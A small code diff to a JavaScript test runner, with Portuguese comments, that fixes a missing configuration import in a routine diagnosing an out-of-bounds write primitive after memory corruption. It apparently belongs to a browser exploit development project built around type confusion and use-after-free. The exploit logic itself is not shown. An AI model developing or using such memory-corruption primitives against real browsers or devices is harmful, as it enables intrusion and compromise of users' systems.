@@ -2,11 +2,13 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import { executeOOBWriteAndCheckPrimitive } from './testJsonTypeConfusionUAFSpeculative.mjs';
+import { OOB_CONFIG } from '../config.mjs'; // <<<< ADICIONE ESTA LINHA DE IMPORTAÇÃO
 
 async function runPrimitiveDiagnostics() {
     const FNAME_RUNNER = "runPrimitiveDiagnostics";
     logS3(`==== INICIANDO Diagnóstico da Primitiva OOB Pós-Corrupção ====`, 'test', FNAME_RUNNER);
 
+    // Agora OOB_CONFIG estará definido aqui
     const offsetCritico = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 
     const valuesToTest = [
@@ -34,7 +36,6 @@ async function runPrimitiveDiagnostics() {
         }
     }
     
-    // Teste adicional: Escrita em offset "seguro" COM PP, com valor problemático
     const offsetSeguro = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + 100;
     const testDescriptionSeguro = `Diag_Val_FFFF_OffsetSeguro_${offsetSeguro.toString(16)}_COM_PP`;
     logS3(`\n--- Executando Teste: ${testDescriptionSeguro} ---`, 'subtest', FNAME_RUNNER);
@@ -45,7 +46,6 @@ async function runPrimitiveDiagnostics() {
         true // Com PP
     );
     await PAUSE_S3(MEDIUM_PAUSE_S3);
-
 
     logS3(`==== Diagnóstico da Primitiva OOB Pós-Corrupção CONCLUÍDO ====`, 'test', FNAME_RUNNER);
 }
